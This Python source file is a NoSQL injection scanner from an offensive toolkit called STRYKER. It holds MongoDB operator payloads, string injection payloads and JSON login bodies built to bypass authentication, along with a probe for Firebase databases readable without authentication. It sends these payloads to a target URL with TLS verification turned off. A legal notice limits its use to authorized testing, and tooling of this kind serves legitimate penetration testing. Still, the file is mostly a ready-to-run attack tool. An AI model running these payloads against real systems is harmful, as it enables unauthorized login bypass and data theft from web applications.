#!/usr/bin/env python3
"""
nosql_injector.py - NoSQL Injection Tester
Part of STRYKER by Andrews

LEGAL NOTICE: For authorized penetration testing ONLY.
Only use against systems you own or have explicit written permission to test.
"""

import argparse
import sys
import io
import json
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fix Windows encoding
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace", line_buffering=True)

import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console(highlight=False)

# ── Payloads ───────────────────────────────────────────────────────────────────

# MongoDB operator injection payloads
MONGO_PAYLOADS = [
    # Boolean operator injections
    {"$gt": ""},
    {"$gt": 0},
    {"$ne": None},
    {"$ne": "invalid"},
    {"$gte": ""},
    {"$in": ["admin", "user", "root"]},
    {"$regex": ".*"},
    {"$where": "1==1"},
]

# String-based payloads for URL params
STRING_PAYLOADS = [
    "[$ne]=invalid",
    "[$gt]=",
    "[$regex]=.*",
    "[$where]=1==1",
    "[$exists]=true",
    "[$nin][]=invalid",
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "' || '1'=='1",
    "'; return true; var a='",
]

# Firebase / Firestore specific
FIREBASE_PAYLOADS = [
    {"orderBy": "__name__"},
    {"startAt": ""},
    {"endAt": "\uf8ff"},
    {"equalTo": None},
]

# ── Finding ────────────────────────────────────────────────────────────────────

class Finding:
    def __init__(self, url, param, payload, vuln_type, evidence="", db_type="NoSQL"):
        self.url       = url
        self.param     = param
        self.payload   = str(payload)
        self.vuln_type = vuln_type
        self.db_type   = db_type
        self.evidence  = evidence

    def __str__(self):
        return f"[{self.vuln_type}] {self.url} | param={self.param} | db={self.db_type}"


# ── Detection ──────────────────────────────────────────────────────────────────

def get_baseline(client, url):
    try:
        resp = client.get(url, timeout=10)
        return resp.status_code, len(resp.text), resp.text
    except httpx.RequestError:
        return None, 0, ""


def check_get_params(client, url, baseline_len, baseline_text):
    """Test URL query parameters with NoSQL payloads."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    if not params:
        return findings

    for param in params:
        for payload in STRING_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_url = parsed._replace(
                query=urllib.parse.urlencode(test_params)
            ).geturl()

            try:
                resp = client.get(test_url, timeout=10)
                len_diff = abs(len(resp.text) - baseline_len)

                # significant change in response = possible injection
                if resp.status_code == 200 and len_diff > 100:
                    findings.append(Finding(
                        url=url, param=param, payload=payload,
                        vuln_type="NoSQL Operator Injection",
                        evidence=f"Response length changed by {len_diff} chars",
                        db_type="MongoDB / NoSQL"
                    ))
                    break

                # auth bypass — was non-200, now 200
                if baseline_len < 100 and resp.status_code == 200 and len(resp.text) > 200:
                    findings.append(Finding(
                        url=url, param=param, payload=payload,
                        vuln_type="NoSQL Auth Bypass",
                        evidence=f"Got 200 response with {len(resp.text)} chars after injection",
                        db_type="MongoDB / NoSQL"
                    ))
                    break

            except httpx.RequestError:
                pass

    return findings


def check_post_json(client, url, baseline_len):
    """Test JSON POST body with MongoDB operator payloads."""
    findings = []

    # Common login/search endpoints to test
    test_bodies = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"user": {"$ne": None}, "pass": {"$ne": None}},
    ]

    for body in test_bodies:
        try:
            resp = client.post(
                url,
                json=body,
                headers={"Content-Type": "application/json"},
                timeout=10
            )

            if resp.status_code in (200, 201) and len(resp.text) > 50:
                # Check for auth tokens or success indicators
                body_lower = resp.text.lower()
                if any(k in body_lower for k in ["token", "success", "welcome", "dashboard", "auth"]):
                    findings.append(Finding(
                        url=url, param="JSON body",
                        payload=json.dumps(body),
                        vuln_type="NoSQL Auth Bypass (POST)",
                        evidence=f"Auth success indicators found in response",
                        db_type="MongoDB"
                    ))
                    break

        except httpx.RequestError:
            pass

    return findings


def check_firebase(client, url, baseline_len):
    """Check for Firebase/Firestore specific misconfigurations."""
    findings = []

    # Check if Firebase REST API is accessible without auth
    firebase_endpoints = []

    # Extract potential Firebase project from URL
    if "firebaseio.com" in url or "firestore.googleapis.com" in url:
        # Try reading data without auth
        try:
            test_url = url.rstrip("/") + ".json"
            resp = client.get(test_url, timeout=10)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data is not None:
                        findings.append(Finding(
                            url=url, param="Firebase REST API",
                            payload=".json endpoint",
                            vuln_type="Firebase Unauthorized Read",
                            evidence=f"Database readable without authentication",
                            db_type="Firebase"
                        ))
                except Exception:
                    pass
        except httpx.RequestError:
            pass

    return findings


# ── Scanner ────────────────────────────────────────────────────────────────────

def scan(url, checks, headers, cookies):
    all_findings = []

    with httpx.Client(
        headers=headers,
        cookies=cookies,
        follow_redirects=True,
        verify=False
    ) as client:
        status, baseline_len, baseline_text = get_baseline(client, url)

        if status is None:
            console.print(f"  [red]Could not reach {url}[/red]")
            return []

        console.print(f"  [dim]Baseline:[/dim] status=[cyan]{status}[/cyan] size=[cyan]{baseline_len}[/cyan] chars")
        console.print()

        if "get" in checks or "all" in checks:
            console.print("  [dim]Testing GET parameters...[/dim]")
            all_findings += check_get_params(client, url, baseline_len, baseline_text)

        if "post" in checks or "all" in checks:
            console.print("  [dim]Testing POST JSON body...[/dim]")
            all_findings += check_post_json(client, url, baseline_len)

        if "firebase" in checks or "all" in checks:
            console.print("  [dim]Testing Firebase endpoints...[/dim]")
            all_findings += check_firebase(client, url, baseline_len)

    return all_findings


# ── Output ─────────────────────────────────────────────────────────────────────

def print_findings(findings):
    console.print()
    if not findings:
        console.print(Panel(
            "[green]No NoSQL injection vulnerabilities detected.[/green]\n"
            "[dim]This does not guarantee the target is secure.[/dim]",
            title="Result", border_style="green"
        ))
        return

    table = Table(
        title=f"[bold red]{len(findings)} Vulnerability(ies) Found[/bold red]",
        box=box.ROUNDED, show_lines=True
    )
    table.add_column("Type",     style="red",     no_wrap=True)
    table.add_column("Param",    style="cyan",    no_wrap=True)
    table.add_column("DB",       style="yellow",  no_wrap=True)
    table.add_column("Payload",  style="magenta", max_width=40)
    table.add_column("Evidence", style="dim")

    for f in findings:
        table.add_row(f.vuln_type, f.param, f.db_type, f.payload, f.evidence)

    console.print(table)


# ── CLI ────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="NoSQL Injector - part of STRYKER",
        epilog="""
Examples:
  python web/nosql_injector.py -u "http://example.com/users?id=1"
  python web/nosql_injector.py -u "http://example.com/login" --checks post
  python web/nosql_injector.py -u "https://project.firebaseio.com/users" --checks firebase

Only test systems you own or have written permission to test.
        """
    )
    parser.add_argument("-u",  "--url",    required=True, help="Target URL")
    parser.add_argument(
        "--checks", nargs="+",
        choices=["get", "post", "firebase", "all"],
        default=["all"],
        help="Which checks to run (default: all)"
    )
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Custom header e.g. 'Authorization: Bearer token'")
    parser.add_argument("-c", "--cookie", action="append", default=[],
                        help="Cookie e.g. 'session=abc123'")
    parser.add_argument("-o", "--output", help="Save findings to file")
    return parser.parse_args()


def main():
    args = parse_args()

    console.print(Panel.fit(
        "[bold red]STRYKER[/bold red] [white]//[/white] [cyan]NoSQL Injector[/cyan]\n"
        "[dim]MongoDB | Firebase | CouchDB | For authorized testing only[/dim]",
        border_style="red"
    ))
    console.print()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()

    checks = args.checks

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  console=console) as progress:
        task = progress.add_task(f"Scanning {args.url[:60]}...", total=None)
        findings = scan(args.url, checks, headers, cookies)
        progress.update(task, completed=True)

    print_findings(findings)

    if args.output and findings:
        with open(args.output, "w") as f:
            for finding in findings:
                f.write(str(finding) + "\n")
        console.print(f"\n[green]Findings saved to {args.output}[/green]")


if __name__ == "__main__":
    main()